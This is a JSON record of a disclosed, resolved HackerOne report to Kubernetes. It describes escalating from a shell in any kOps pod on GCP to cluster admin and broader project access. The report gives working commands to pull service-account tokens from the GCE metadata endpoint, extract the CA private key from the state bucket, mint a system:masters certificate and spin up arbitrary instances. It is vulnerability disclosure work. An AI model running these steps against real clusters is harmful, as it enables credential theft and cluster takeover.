@@ -1,0 +1,175 @@
+{
+  "id": 1842829,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODQyODI5",
+  "url": "https://hackerone.com/reports/1842829",
+  "title": "Privilege Escalation in kOps using GCE/GCP Provider",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2023-01-22T00:39:33.518Z",
+  "submitted_at": "2023-01-22T00:39:36.189Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jpts",
+    "url": "/jpts",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 39386,
+    "url": "https://hackerone.com/kubernetes",
+    "handle": "kubernetes",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Kubernetes",
+      "twitter_handle": "kubernetesio",
+      "website": "https://kubernetes.io/",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-08-04T19:24:50.539Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-07-05T19:24:49.231Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nWhen using kOps with the GCP provider, it is possible for a user with shell access to any pod, to escalate their privileges to cluster admin. During provisioning of the cluster, kOps gives all nodes access to the state storage bucket through the service account associated with the instance. Any user with shell access can request the service account credentials, and read sensitive information from the state store. Using this information, the user can privesc to cluster admin, compromising the entire cluster. It is further possible to compromise a privileged GCP service account associated with the control-plane nodes and takeover other resources in the GCP project.\n\n## Kubernetes Version:\nKubernetes: v1.25.5\n\n## Component Version:\nkOps: v1.25.3\n\n## Steps To Reproduce:\n### Cluster Setup:\n\nThe test cluster was setup as close to the [getting started](https://kops.sigs.k8s.io/getting_started/gce/) guide as possible.\n```bash\nexport KOPS_STATE_STORE=gs://kops-state-test/\nexport PROJECT=`gcloud config get-value project`\n\ngsutil mb $KOPS_STATE_STORE\nkops create cluster kops.k8s.local --zones europe-west1-b --state ${KOPS_STATE_STORE} --project=$PROJECT --master-size=n1-standard-2 --node-size=n1-standard-2\nkops update cluster --name kops.k8s.local --yes --admin\nkops validate cluster --wait 10m\n```\n### Privesc\n  1. Add a demo container in which user is allow shell access (manifest attached):\n  `k apply -f shell.yaml`\n  2. Give ourselves a shell:\n  `k exec -it shell-5d64dd647c-8l8s6 -it -- ash`\n  3. Grab the service account token and state bucket name\n  ```\n  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O default.token\n  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script -O- | grep ConfigBase\n  ```\n  4. Copy file back to the host\n  ```\n  k cp shell-5d64dd647c-8l8s6:/default.token default.token\n  ```\n  5.  Ensure normal gcloud auth not in use and set token environment var\n  ```\n  gcloud auth revoke\n  export CLOUDSDK_AUTH_ACCESS_TOKEN=$(jq .access_token -r ./default.token)\n  ```\n  6. Grab the kubernetes CA keys\n  ```\n  mkdir -p keys\n  gcloud storage cat gs://kops-state-test/kops.k8s.local/pki/private/kubernetes-ca/keyset.yaml | yq e '.spec.keys[0].privateMaterial' - | base64 -d > keys/ca.key\n  gcloud storage cat gs://kops-state-test/kops.k8s.local/pki/private/kubernetes-ca/keyset.yaml | yq e '.spec.keys[0].publicMaterial' - | base64 -d > keys/ca.pem\n  ```\n  7. Generate system:masters cert (csr.json template attached)\n  ```\n  cd keys\n  cfssl gencert -ca=ca.pem -ca-key=ca.key -profile=kubernetes csr.json | cfssljson -bare user\n  ```\n  8. Construct new kubeconfig\n  ```\n  export KUBECONFIG=./pwn.kconfig\n  k config set-credentials pwn --client-certificate=user.pem --client-key=user-key.pem\n  k config set-cluster kops --certificate-authority=ca.pem --server=https://<kops-ip>\n  k config set-context pwn@kops --cluster=kops --user=pwn\n  k config use-context pwn@kops\n  ```\n  9. Check we are cluster-admin\n  `k auth can-i '*' '*' -A`\n  10. Deploy a pod on the master node (example manifest included), make sure to edit to the correct node name\n  `k apply -f shell-master.yaml`\n  11. Give ourselves a shell:\n  `k exec -it shell-78d66f6f7c-ft7ch -it -- ash`\n  12. Grab the privileged GCP service account token\n  ```\n  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O admin.token\n  ```\n 13. Copy the token back to our host\n  ```\n  k cp shell-78d66f6f7c-ft7ch:/admin.token admin.token\n  ```\n  14. Set our credentials\n  ```\n  export CLOUDSDK_AUTH_ACCESS_TOKEN=$(jq .access_token -r ./admin.token)\n  ```\n  15. Run a cryptominer ....\n  ```\n  gcloud compute instances create miner --image-family=ubuntu-2204-lts --zone=europe-west1-b --image-project=ubuntu-os-cloud\n  ```\n\n## Supporting Material/References:\n  * shell.yaml - basic alpine deployment to simulator a user with shell access\n  * shell-master.yaml - similar simple deployment, targeting a master node\n  * csr.json - used to configure cfssl to generate the malicious system:masters mTLS certs\n  * auth-can-i.png - proof we have cluster admin\n  * miner.png - proof we can spin up arbitrary instances\n  * [Kubernetes Engine Service Agent Role](https://cloud.google.com/iam/docs/understanding-roles#container.serviceAgent)\n\n## Tools used\n * https://github.com/cloudflare/cfssl\n * https://github.com/mikefarah/yq\n\n## Impact\n\nOnce the attacker has compromised the cluster, they have access to all cluster resources. This includes any secrets/data stored by the cluster and also any secrets/data that is accessible by any GCP service accounts in use by the cluster. As the attacker is able to compromise the cluster, they can compromise the master nodes. In GCE kOps, the master node service accounts have the \"Kubernetes Engine Service Agent\" role, which is highly permissive, and would likely allow the compromise of other resources in the GCP project. Since the role has compute create permissions, it could also be abused for  attacks such as crypto-mining.",
+  "bounty_amount": "2500.0",
+  "formatted_bounty": "$2,500",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2131950,
+      "file_name": "auth-can-i.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/f1qgv4uue1c9m8uvc8bi9h8x11q6?response-content-disposition=attachment%3B%20filename%3D%22auth-can-i.png%22%3B%20filename%2A%3DUTF-8%27%27auth-can-i.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQQSQTJWE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143402Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICMbzzKBCraFobXOcCqfodxzM%2F89seEFEtkolz9ym8yYAiEA%2Fsvto%2F251HQZfvVraGJNSEE9N05zP%2BaGv%2FBSxh9MwpMqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDLRiPgXnAALYKAeN%2BSqPBWHgzJxP51a7MbYBgyoxP1LDcsLwdgUbUtgcBcVihNzgjkpkX1z4v6%2FjmlETXMHpM%2FauQHP0xGmCQhKLjGzIinKmY6tZ4kZl141nt3bExoUI5fWVsWEB7O84QdqCtoGtUZA0f1O7EIdYBJQb%2FmNKqwZEWaU%2F7PgkRk0H3XNrhegcIQuivj4XNypNwJPOxdtitDeFDYLpO12smqVJ5amk5ztkBZAoq8E%2Fxhaobm%2BP%2BcLxlPXFMWF2mULZXnUB%2BQexzDE%2FeLT2%2F%2FCafZViAqQkXNNhRc1onMPfkORBF3TWhoGrNIEBTcxPrms3Wk4KLaYQfHMpRmDn8NdWo6rpTdWGmrWp15yhtPtvFe8ReFe1qwFRwBcnvbxbIpos0u911N8KZcdmsYZha%2FoJ5gCaJUsYWiujZHGn6f5ac2aDT02iO7y%2FvFGh%2BiiCuJnTr%2FTPbUjsuYpUKRWvX0lbNazDhrREV3P7R16HgWupyfQVvDMUxflgXVEIBtoH%2F3PlfIvSwDTjDdb04Ji5mlT6sdPmo0lfcQgYurG6SnsI6MgswsJjYI2WOlv2p1tmsRt%2ByFO3bcNXUIH7i5sX1gS7pDgOE42otZhfgnqjvs281xt%2FxdyiAtfzcabnG58C%2F6LMJcKeiNXLZWzeSL%2FsIKZbRGv7%2BbTcyt4NUuw0Q8qvXsuEQa6pysO9CNZrAUmcPtXKlyDUNPvymrupyNL%2BTMEhXfQtQ9GR77FBbp2W1g6N%2BZC4U3Pyjd%2B5zay1bpkCArA0SfRd1XoibXzi71Y30tA%2FNUr4Rib62%2FqhPMoV5VVGpkLtyTBkmmVyf%2FESSQWdUjQsHkdlrlefv2cMA97YY4fWehghMcS0o3sWAL6LKEbcYmXkUd9uubUwzuGtrgY6sQGqVPKMUtXZrBKkrmums9UdPoAQiHM9bDEAcx6q6dTbsaND9EZI1kiWjVkhOtlNqyZzZiln%2BiwOaBZiB%2FQiRz7jN%2F4j0Xau5GsUBxICzxeYF6QfWg9kdjLfouuoymOG0OykNz%2FXKrjHdQ4BrNO6%2BP5iYizFhSP9s5uBbIRfMqyUWVBdXawoABdBVubTk5tCNVNh%2FWifWwE4VS1yIJoLSgY8wRQ3gW0tXMWlxD895PitKQQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7b102c10646341f26c66bfaab062e9c96c3719332fe5bc4da5fe6d73b15a41a9",
+      "file_size": 14104,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2131951,
+      "file_name": "shell.yaml",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tpahdk515j5v7skirowdxkeufkss?response-content-disposition=attachment%3B%20filename%3D%22shell.yaml%22%3B%20filename%2A%3DUTF-8%27%27shell.yaml&response-content-type=application%2Fx-yaml&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQQSQTJWE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143402Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICMbzzKBCraFobXOcCqfodxzM%2F89seEFEtkolz9ym8yYAiEA%2Fsvto%2F251HQZfvVraGJNSEE9N05zP%2BaGv%2FBSxh9MwpMqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDLRiPgXnAALYKAeN%2BSqPBWHgzJxP51a7MbYBgyoxP1LDcsLwdgUbUtgcBcVihNzgjkpkX1z4v6%2FjmlETXMHpM%2FauQHP0xGmCQhKLjGzIinKmY6tZ4kZl141nt3bExoUI5fWVsWEB7O84QdqCtoGtUZA0f1O7EIdYBJQb%2FmNKqwZEWaU%2F7PgkRk0H3XNrhegcIQuivj4XNypNwJPOxdtitDeFDYLpO12smqVJ5amk5ztkBZAoq8E%2Fxhaobm%2BP%2BcLxlPXFMWF2mULZXnUB%2BQexzDE%2FeLT2%2F%2FCafZViAqQkXNNhRc1onMPfkORBF3TWhoGrNIEBTcxPrms3Wk4KLaYQfHMpRmDn8NdWo6rpTdWGmrWp15yhtPtvFe8ReFe1qwFRwBcnvbxbIpos0u911N8KZcdmsYZha%2FoJ5gCaJUsYWiujZHGn6f5ac2aDT02iO7y%2FvFGh%2BiiCuJnTr%2FTPbUjsuYpUKRWvX0lbNazDhrREV3P7R16HgWupyfQVvDMUxflgXVEIBtoH%2F3PlfIvSwDTjDdb04Ji5mlT6sdPmo0lfcQgYurG6SnsI6MgswsJjYI2WOlv2p1tmsRt%2ByFO3bcNXUIH7i5sX1gS7pDgOE42otZhfgnqjvs281xt%2FxdyiAtfzcabnG58C%2F6LMJcKeiNXLZWzeSL%2FsIKZbRGv7%2BbTcyt4NUuw0Q8qvXsuEQa6pysO9CNZrAUmcPtXKlyDUNPvymrupyNL%2BTMEhXfQtQ9GR77FBbp2W1g6N%2BZC4U3Pyjd%2B5zay1bpkCArA0SfRd1XoibXzi71Y30tA%2FNUr4Rib62%2FqhPMoV5VVGpkLtyTBkmmVyf%2FESSQWdUjQsHkdlrlefv2cMA97YY4fWehghMcS0o3sWAL6LKEbcYmXkUd9uubUwzuGtrgY6sQGqVPKMUtXZrBKkrmums9UdPoAQiHM9bDEAcx6q6dTbsaND9EZI1kiWjVkhOtlNqyZzZiln%2BiwOaBZiB%2FQiRz7jN%2F4j0Xau5GsUBxICzxeYF6QfWg9kdjLfouuoymOG0OykNz%2FXKrjHdQ4BrNO6%2BP5iYizFhSP9s5uBbIRfMqyUWVBdXawoABdBVubTk5tCNVNh%2FWifWwE4VS1yIJoLSgY8wRQ3gW0tXMWlxD895PitKQQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=165e62317762f64a6e3fb2f3361057ec42cad47e30cb41fb5bcc553030438d37",
+      "file_size": 332,
+      "type": "application/x-yaml",
+      "moderated": null
+    },
+    {
+      "id": 2131952,
+      "file_name": "csr.json",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/abtqulk8gi2ftjf5aokzlse3re37?response-content-disposition=attachment%3B%20filename%3D%22csr.json%22%3B%20filename%2A%3DUTF-8%27%27csr.json&response-content-type=application%2Fjson&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQQSQTJWE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143402Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICMbzzKBCraFobXOcCqfodxzM%2F89seEFEtkolz9ym8yYAiEA%2Fsvto%2F251HQZfvVraGJNSEE9N05zP%2BaGv%2FBSxh9MwpMqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDLRiPgXnAALYKAeN%2BSqPBWHgzJxP51a7MbYBgyoxP1LDcsLwdgUbUtgcBcVihNzgjkpkX1z4v6%2FjmlETXMHpM%2FauQHP0xGmCQhKLjGzIinKmY6tZ4kZl141nt3bExoUI5fWVsWEB7O84QdqCtoGtUZA0f1O7EIdYBJQb%2FmNKqwZEWaU%2F7PgkRk0H3XNrhegcIQuivj4XNypNwJPOxdtitDeFDYLpO12smqVJ5amk5ztkBZAoq8E%2Fxhaobm%2BP%2BcLxlPXFMWF2mULZXnUB%2BQexzDE%2FeLT2%2F%2FCafZViAqQkXNNhRc1onMPfkORBF3TWhoGrNIEBTcxPrms3Wk4KLaYQfHMpRmDn8NdWo6rpTdWGmrWp15yhtPtvFe8ReFe1qwFRwBcnvbxbIpos0u911N8KZcdmsYZha%2FoJ5gCaJUsYWiujZHGn6f5ac2aDT02iO7y%2FvFGh%2BiiCuJnTr%2FTPbUjsuYpUKRWvX0lbNazDhrREV3P7R16HgWupyfQVvDMUxflgXVEIBtoH%2F3PlfIvSwDTjDdb04Ji5mlT6sdPmo0lfcQgYurG6SnsI6MgswsJjYI2WOlv2p1tmsRt%2ByFO3bcNXUIH7i5sX1gS7pDgOE42otZhfgnqjvs281xt%2FxdyiAtfzcabnG58C%2F6LMJcKeiNXLZWzeSL%2FsIKZbRGv7%2BbTcyt4NUuw0Q8qvXsuEQa6pysO9CNZrAUmcPtXKlyDUNPvymrupyNL%2BTMEhXfQtQ9GR77FBbp2W1g6N%2BZC4U3Pyjd%2B5zay1bpkCArA0SfRd1XoibXzi71Y30tA%2FNUr4Rib62%2FqhPMoV5VVGpkLtyTBkmmVyf%2FESSQWdUjQsHkdlrlefv2cMA97YY4fWehghMcS0o3sWAL6LKEbcYmXkUd9uubUwzuGtrgY6sQGqVPKMUtXZrBKkrmums9UdPoAQiHM9bDEAcx6q6dTbsaND9EZI1kiWjVkhOtlNqyZzZiln%2BiwOaBZiB%2FQiRz7jN%2F4j0Xau5GsUBxICzxeYF6QfWg9kdjLfouuoymOG0OykNz%2FXKrjHdQ4BrNO6%2BP5iYizFhSP9s5uBbIRfMqyUWVBdXawoABdBVubTk5tCNVNh%2FWifWwE4VS1yIJoLSgY8wRQ3gW0tXMWlxD895PitKQQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8fab76d3f680e868bb54dd680fad630fdf0eb0acc0a3646d929c1148398724c3",
+      "file_size": 144,
+      "type": "application/json",
+      "moderated": null
+    },
+    {
+      "id": 2131960,
+      "file_name": "miner.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7j3fjrkfzkwm72ztzkhtvrh4mrr2?response-content-disposition=attachment%3B%20filename%3D%22miner.png%22%3B%20filename%2A%3DUTF-8%27%27miner.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQQSQTJWE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143402Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICMbzzKBCraFobXOcCqfodxzM%2F89seEFEtkolz9ym8yYAiEA%2Fsvto%2F251HQZfvVraGJNSEE9N05zP%2BaGv%2FBSxh9MwpMqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDLRiPgXnAALYKAeN%2BSqPBWHgzJxP51a7MbYBgyoxP1LDcsLwdgUbUtgcBcVihNzgjkpkX1z4v6%2FjmlETXMHpM%2FauQHP0xGmCQhKLjGzIinKmY6tZ4kZl141nt3bExoUI5fWVsWEB7O84QdqCtoGtUZA0f1O7EIdYBJQb%2FmNKqwZEWaU%2F7PgkRk0H3XNrhegcIQuivj4XNypNwJPOxdtitDeFDYLpO12smqVJ5amk5ztkBZAoq8E%2Fxhaobm%2BP%2BcLxlPXFMWF2mULZXnUB%2BQexzDE%2FeLT2%2F%2FCafZViAqQkXNNhRc1onMPfkORBF3TWhoGrNIEBTcxPrms3Wk4KLaYQfHMpRmDn8NdWo6rpTdWGmrWp15yhtPtvFe8ReFe1qwFRwBcnvbxbIpos0u911N8KZcdmsYZha%2FoJ5gCaJUsYWiujZHGn6f5ac2aDT02iO7y%2FvFGh%2BiiCuJnTr%2FTPbUjsuYpUKRWvX0lbNazDhrREV3P7R16HgWupyfQVvDMUxflgXVEIBtoH%2F3PlfIvSwDTjDdb04Ji5mlT6sdPmo0lfcQgYurG6SnsI6MgswsJjYI2WOlv2p1tmsRt%2ByFO3bcNXUIH7i5sX1gS7pDgOE42otZhfgnqjvs281xt%2FxdyiAtfzcabnG58C%2F6LMJcKeiNXLZWzeSL%2FsIKZbRGv7%2BbTcyt4NUuw0Q8qvXsuEQa6pysO9CNZrAUmcPtXKlyDUNPvymrupyNL%2BTMEhXfQtQ9GR77FBbp2W1g6N%2BZC4U3Pyjd%2B5zay1bpkCArA0SfRd1XoibXzi71Y30tA%2FNUr4Rib62%2FqhPMoV5VVGpkLtyTBkmmVyf%2FESSQWdUjQsHkdlrlefv2cMA97YY4fWehghMcS0o3sWAL6LKEbcYmXkUd9uubUwzuGtrgY6sQGqVPKMUtXZrBKkrmums9UdPoAQiHM9bDEAcx6q6dTbsaND9EZI1kiWjVkhOtlNqyZzZiln%2BiwOaBZiB%2FQiRz7jN%2F4j0Xau5GsUBxICzxeYF6QfWg9kdjLfouuoymOG0OykNz%2FXKrjHdQ4BrNO6%2BP5iYizFhSP9s5uBbIRfMqyUWVBdXawoABdBVubTk5tCNVNh%2FWifWwE4VS1yIJoLSgY8wRQ3gW0tXMWlxD895PitKQQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0635ed70c14c145898ca786a893a268fbb5dd05564aa1f6c93da9cfcf88661bd",
+      "file_size": 40948,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2131965,
+      "file_name": "shell-master.yaml",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/760v242silsh360abtpv83qls89j?response-content-disposition=attachment%3B%20filename%3D%22shell-master.yaml%22%3B%20filename%2A%3DUTF-8%27%27shell-master.yaml&response-content-type=application%2Fx-yaml&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQQSQTJWE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143402Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICMbzzKBCraFobXOcCqfodxzM%2F89seEFEtkolz9ym8yYAiEA%2Fsvto%2F251HQZfvVraGJNSEE9N05zP%2BaGv%2FBSxh9MwpMqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDLRiPgXnAALYKAeN%2BSqPBWHgzJxP51a7MbYBgyoxP1LDcsLwdgUbUtgcBcVihNzgjkpkX1z4v6%2FjmlETXMHpM%2FauQHP0xGmCQhKLjGzIinKmY6tZ4kZl141nt3bExoUI5fWVsWEB7O84QdqCtoGtUZA0f1O7EIdYBJQb%2FmNKqwZEWaU%2F7PgkRk0H3XNrhegcIQuivj4XNypNwJPOxdtitDeFDYLpO12smqVJ5amk5ztkBZAoq8E%2Fxhaobm%2BP%2BcLxlPXFMWF2mULZXnUB%2BQexzDE%2FeLT2%2F%2FCafZViAqQkXNNhRc1onMPfkORBF3TWhoGrNIEBTcxPrms3Wk4KLaYQfHMpRmDn8NdWo6rpTdWGmrWp15yhtPtvFe8ReFe1qwFRwBcnvbxbIpos0u911N8KZcdmsYZha%2FoJ5gCaJUsYWiujZHGn6f5ac2aDT02iO7y%2FvFGh%2BiiCuJnTr%2FTPbUjsuYpUKRWvX0lbNazDhrREV3P7R16HgWupyfQVvDMUxflgXVEIBtoH%2F3PlfIvSwDTjDdb04Ji5mlT6sdPmo0lfcQgYurG6SnsI6MgswsJjYI2WOlv2p1tmsRt%2ByFO3bcNXUIH7i5sX1gS7pDgOE42otZhfgnqjvs281xt%2FxdyiAtfzcabnG58C%2F6LMJcKeiNXLZWzeSL%2FsIKZbRGv7%2BbTcyt4NUuw0Q8qvXsuEQa6pysO9CNZrAUmcPtXKlyDUNPvymrupyNL%2BTMEhXfQtQ9GR77FBbp2W1g6N%2BZC4U3Pyjd%2B5zay1bpkCArA0SfRd1XoibXzi71Y30tA%2FNUr4Rib62%2FqhPMoV5VVGpkLtyTBkmmVyf%2FESSQWdUjQsHkdlrlefv2cMA97YY4fWehghMcS0o3sWAL6LKEbcYmXkUd9uubUwzuGtrgY6sQGqVPKMUtXZrBKkrmums9UdPoAQiHM9bDEAcx6q6dTbsaND9EZI1kiWjVkhOtlNqyZzZiln%2BiwOaBZiB%2FQiRz7jN%2F4j0Xau5GsUBxICzxeYF6QfWg9kdjLfouuoymOG0OykNz%2FXKrjHdQ4BrNO6%2BP5iYizFhSP9s5uBbIRfMqyUWVBdXawoABdBVubTk5tCNVNh%2FWifWwE4VS1yIJoLSgY8wRQ3gW0tXMWlxD895PitKQQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9f54ef4975be8d43eaed8ad68c826d17e2859a24620cbff95d3d889a4810079e",
+      "file_size": 375,
+      "type": "application/x-yaml",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-08-04T19:24:49.400Z",
+  "allow_singular_disclosure_after": -16657753.079604208,
+  "singular_disclosure_allowed": true,
+  "vote_count": 50,
+  "voters": [
+    "0xsp1der",
+    "shreyaschavhan",
+    "n1m0",
+    "zy9ard3",
+    "13370verride",
+    "dilawer",
+    "kmxx",
+    "kayizz",
+    "mikkz",
+    "kerolesmagdy",
+    "and 40 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "adjacent",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 32525,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/kubernetes/kops",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
